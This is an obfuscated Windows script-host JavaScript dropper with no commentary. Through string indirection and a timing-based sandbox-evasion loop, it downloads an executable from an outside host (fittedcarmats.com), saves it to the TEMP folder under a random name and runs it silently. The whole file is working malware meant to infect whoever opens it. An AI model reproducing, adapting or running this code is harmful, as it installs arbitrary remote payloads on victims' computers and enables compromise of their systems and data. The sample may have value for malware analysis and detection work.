var Lb = false;
var rn = "CreateObject";
var Ge = function e() {return WScript[rn]("WScript.Shell");}(), Z = 11;
var e0 = "MSXML2.XMLHTTP";
var ke = 2123213;
var ua = 0;
function f(J){Ge["Run"](J, ua, ua);};
function vQ(){return "" + e0;};
function d(XM, n){ua = ua * 1; return XM - n;};
function A(){return rn;};
/*@cc_on
  @if (@_win32 || @_win64)
    Lb = true;
  @end
@*/
if (Lb)
{
var Po = "";
function D(){return 22;};
var WV = 0; var bb = 0;
function LD()
{
var f0 = new this["Date"]();
var Pp = f0["getUTCMilliseconds"]();
WScript["Sleep"](D());
var f0 = new this["Date"]();
var i = f0["getUTCMilliseconds"]();
WScript["Sleep"](D());
var f0 = new this["Date"]();
var Ti = f0["getUTCMilliseconds"]();
var WV = "m";
WV = d(i, Pp);
var bb = "Ul";
bb = d(Ti, i);
Po = "open";
return d(WV, bb);
}
var aV = false;
var A0 = false;
for (var nG = ua; nG < D() * 1; nG++){if (LD() != ua){
aV = true; 
bb = "31" + 11 * WV + bb; 
A0 = true; 
break;
}}
function cy() {return ((aV == true) && (aV == A0)) ? 1 : ua;};
if (aV && cy() && A0){
function h() {return Ge["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "wJPoVKZQWocQkLx.exe";};
 x = vQ();
 R = WScript[rn](x);
 var g = 1;
 while (g){
try {
R[Po]("GET", "http://fittedcarmats.com/m4usa", false);
R["send"]();
C = "Sleep";
for (;;){WScript[C](D() * 11); if (R["readystate"] >= 2 * 2) break;};
g = ua;
} catch(xX){};
}
function pn(Yf) {var a = (1, 2, 3, 4, 5, Yf); return a;};
Wn = WScript[A()]("ADODB.Stream");
x = Wn;
x[Po]();
x["type"] = pn(1);
x["write"](R["ResponseBody"]);
Wn["position"] = pn(ua);
x["Save" + "ToFile"](h(), 2);
Wn["c"+"lose"]();
dW = h();
f(dW);
}
}

